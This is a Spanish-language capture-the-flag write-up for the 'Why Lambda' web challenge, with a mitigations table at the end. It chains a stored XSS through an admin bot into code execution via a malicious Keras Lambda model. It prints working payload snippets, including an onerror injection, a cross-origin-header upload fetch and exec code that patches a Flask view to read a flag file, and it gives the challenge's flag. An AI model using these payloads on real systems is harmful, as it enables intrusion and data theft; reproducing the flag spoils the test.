# Why Lambda — HTB (Hard, Web)

> **Flag:** `HTB{th3_gr33ks_g0t_1t_4ll_wr0ng}`
> Una sola petición, menos de diez segundos. La cadena se verificó antes en un
> laboratorio local reconstruido desde el Dockerfile del reto, y contra el
> objetivo real salió al primer intento.
>
> **Técnica:** XSS almacenado en el panel de admin → el bot lo ejecuta con sesión
> válida → sube un modelo Keras `.h5` con capa `Lambda` → **ejecución de código**
> al cargarlo → se reemplaza una vista pública de Flask para sacar la bandera.

---

## 1. El reto

Una web de "machine learning alienígena" con un panel de administración
restringido. Stack: Flask + Vue 3, `tensorflow/tensorflow:2.12.0`, nginx, y
—dato que siempre importa— **google-chrome-stable instalado en la imagen**.

Cuando un Dockerfile de un reto web instala Chrome, hay un bot. Y un bot es
casi siempre el camino para conseguir la sesión que no tenés.

Las credenciales no sirven de nada:

```bash
ALIENT_USERNAME=zaphod_beeblebrox
ALIENT_PASSWORD=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)
```

32 caracteres aleatorios por contenedor. No hay fuerza bruta.

---

## 2. El nombre del reto es la pista

`backend/model.py`:

```python
def test_model(path):
    m = keras.models.load_model(path)      # <-- el sumidero
    metrics = m.evaluate(X_test, Y_test)
    return {"loss": ..., "acc": ...}
```

Una capa `Lambda` de Keras guarda su función como **bytecode de Python
marshalado** dentro del `.h5`. Cargar el modelo la reconstruye y la ejecuta.
Eso es ejecución de código arbitrario por diseño del formato, y el reto se
llama *Why Lambda*.

Quién lo llama, en `app.py`:

```python
@app.route("/api/internal/model", methods=["POST"])
@authenticated          # necesita sesión
@csrf_protection        # necesita cabecera X-SPACE-NO-CSRF: 1
def submit_model():
    ...
    file.save(os.path.join(MODELS, name))
    test_model(MODELS + name)
```

Dos cerraduras: sesión de admin y una cabecera. Las dos las abre un XSS.

---

## 3. La cadena, eslabón por eslabón

### 3.1 El bot se invoca solo

```python
@app.route("/api/complaint", methods=["POST"])
@csrf_protection                       # sin @authenticated
def submit_complaint():
    complaints.add_complaint(description, image_data, prediction)
    Thread(target=complaints.check_complaints,
           args=(ALIEN_USERNAME, ALIENT_PASSWORD,)).start()
```

Enviar una queja —**sin autenticarse**— lanza un Chrome headless que se loguea
como el alien y abre `/dashboard`. Ahí renderiza todas las quejas.

### 3.2 El XSS

`Dashboard.vue` construye HTML con interpolación de plantilla:

```js
getPredictionText(complaint) {
    return `<p>... el dígito: <b>${complaint.prediction}</b></p>`;
}
```

y `ImageBanner.vue` lo pinta con `v-html`:

```html
<span class="text" v-html="textContent"></span>
```

El backend solo comprueba `prediction == None`, así que cualquier cadena pasa.

**Detalle que cuesta tiempo si no se sabe: `v-html` NO ejecuta `<script>`.**
Igual que `innerHTML`, los scripts insertados así no corren. Hace falta un
manejador de evento:

```html
</b><img src=x onerror="...">
```

El `src=x` falla a propósito — ese fallo es lo que dispara `onerror`.

### 3.3 La cabeza anti-CSRF no protege de un XSS

```python
csrf_header = request.headers.get("X-SPACE-NO-CSRF")
if csrf_header != "1": return 403
```

Una cabecera personalizada detiene un CSRF clásico —un formulario de otro sitio
no puede ponerla— pero **no detiene nada que ya corra en el mismo origen**. El
XSS la añade en su propio `fetch` y pasa.

### 3.4 El payload

El modelo viaja en base64 **dentro del propio XSS**. La primera versión lo
guardaba en una queja aparte y lo buscaba con `find()`: dos eslabones y ninguna
forma de saber cuál fallaba.

```js
var u = Uint8Array.from(atob('<base64>'), c => c.charCodeAt(0));
var f = new FormData(); f.append('file', new Blob([u]), 'p.h5');
fetch('/api/internal/model', {method:'POST', body:f,
      headers:{'X-SPACE-NO-CSRF':'1'}, credentials:'include'})
```

### 3.5 La exfiltración

Con código ejecutando dentro del proceso de Flask, se reemplaza la función de
vista de una ruta **que ya es pública**:

```python
import sys
m = sys.modules['__main__']
m.app.view_functions['get_metrics'] = lambda: open('/app/flag.txt').read()
```

Y la bandera sale con un `curl` normal, sin sesión. No hace falta salida a
internet desde el contenedor, que no la hay.

---

## 4. Construir el `.h5`: tres cosas que hay que hacer bien

Las tres fallaron una vez cada una.

**1. Generarlo en la misma imagen del reto.** El bytecode va marshalado y el
formato cambia entre versiones de Python. TF 2.12 es Python 3.8; generarlo con
un 3.13 produce un modelo que el objetivo no puede cargar.

```bash
docker run --rm -v $PWD:/out tensorflow/tensorflow:2.12.0 python /out/build.py
```

**2. El payload va como CONSTANTE dentro del lambda, no como variable global.**
El marshal serializa el código y sus constantes, **no las globales del módulo**:

```python
PAYLOAD = "..."
keras.layers.Lambda(lambda x: (exec(PAYLOAD), x)[1])   # NameError al recargar
keras.layers.Lambda(lambda x: (exec("..."), x)[1])     # correcto
```

**3. Las funciones inyectadas no pueden cerrar sobre variables de `exec`.**

```python
"f = open('/app/flag.txt').read()\n"
"m.app.view_functions['get_metrics'] = lambda: f"     # NameError: name 'f'
"m.app.view_functions['get_metrics'] = lambda: open('/app/flag.txt').read()"
```

**Y una cuarta que ahorra tamaño:** la Lambda ejecuta al **cargar** el modelo,
no al evaluarlo. El modelo no necesita ser evaluable, así que sobra la capa
`Dense`: de 46 KB a 8,4 KB. Importa, porque el base64 viaja dentro de un
atributo HTML.

---

## 5. El 422 que parecía un fallo y era el éxito

```
POST /api/internal/model HTTP/1.1  422
```

`submit_model` envuelve `test_model` en un `try/except`. Sin la capa `Dense`,
`m.evaluate()` lanza y el endpoint responde 422 — **pero la Lambda ya se
ejecutó al cargar el modelo**. El servidor informa de un error y la ejecución
de código ya ocurrió.

Estuve leyendo ese 422 como fracaso.

---

## 6. La lección de método, que costó más que el reto

Disparé **tres veces a ciegas** contra el objetivo antes de montar un sitio
donde pudiera ver. Cada intento devolvía lo mismo: silencio, algún 502, ninguna
pista de en qué eslabón se rompía la cadena. Tres hipótesis y ninguna forma de
distinguirlas.

Reconstruir el reto desde su propio Dockerfile dio la respuesta **en el primer
intento**, porque los registros del contenedor muestran la cadena entera:

```
GET  /api/internal/complaints   401   ← el bot aún sin sesión
POST /api/login                 200   ← se loguea
GET  /api/internal/complaints   200   ← carga las quejas
GET  /x                         200   ← el <img src=x> falla y dispara onerror
POST /api/internal/model        422   ← sube el modelo — RCE
```

Cuando un objetivo no se deja observar, el trabajo no es adivinar mejor: es
construir el sitio donde sí se pueda observar.

*(El laboratorio local necesitó fijar `vue-router@4.0.14`. El `package.json`
pide `"4"` sin versión exacta y hoy resuelve a una incompatible con ese webpack:
el frontend no compila, `/dashboard` da 404 y el bot muere buscando el
formulario de login. No es el reto, es la reconstrucción.)*

---

## 7. Q&A de entrevista

**¿Por qué una capa `Lambda` de Keras es ejecución de código?**
Porque serializa la función como bytecode marshalado dentro del `.h5`, y
`load_model` la reconstruye y la llama. No es un fallo de implementación: es el
formato haciendo lo que promete. Por eso cargar un modelo de origen no confiable
equivale a ejecutar un programa de origen no confiable.

**¿Por qué la cabecera anti-CSRF no detuvo nada?**
Porque protege contra peticiones de **otro origen** — un formulario externo no
puede añadir cabeceras personalizadas. Un XSS corre **en el mismo origen**, así
que la pone él mismo. Protege del CSRF y no del XSS; son amenazas distintas.

**¿Por qué no funcionó `<script>` dentro de `v-html`?**
Porque `v-html` asigna `innerHTML`, y el parser HTML marca como no ejecutables
los `<script>` insertados así. Los manejadores de evento (`onerror`, `onload`)
sí corren, y por eso `<img src=x onerror=...>` es el patrón.

**¿Cómo se saca la bandera sin salida a internet desde el contenedor?**
Reemplazando en memoria la función de vista de una ruta que ya es pública. La
exfiltración deja de necesitar un canal externo: sale por una petición normal
del propio servicio.

**¿Por qué había que construir el modelo dentro de Docker?**
Porque el bytecode marshalado depende de la versión de Python. Construirlo con
otra versión da un fichero que el objetivo rechaza, y el error no dice eso.

**¿Qué significó el 422?**
Éxito. El endpoint captura la excepción de `evaluate`, pero la Lambda se ejecuta
antes, al cargar. Un código de error del servidor puede llegar después de que el
ataque ya ocurrió.

---

## 8. Mitigaciones

| capa | arreglo |
|---|---|
| **El modelo** | No cargar modelos de origen no confiable. Keras 3 añadió `safe_mode=True`, que bloquea la deserialización de `Lambda` por defecto — con TF 2.12 no existe esa red. Alternativa: formatos sin código (SavedModel revisado, ONNX) y validación de la topología antes de cargar. |
| **El XSS** | No construir HTML por interpolación de cadenas para pasarlo a `v-html`. `{{ }}` escapa por defecto; `v-html` es una renuncia explícita a ese escape. Si hace falta HTML, sanear con una lista blanca. |
| **El CSRF** | La cabecera está bien contra CSRF, pero no sustituye a defensas contra XSS. Añadir CSP sin `unsafe-inline`, que habría detenido el `onerror` en seco. |
| **El bot** | Que no tenga más privilegios de los necesarios, y que no visite contenido controlado por usuarios anónimos con una sesión de administrador. |
| **La subida** | `".h5" in filename` acepta `evil.h5.txt` y cualquier cosa que contenga esa cadena. Validar extensión al final del nombre, y aislar el proceso que carga el modelo. |
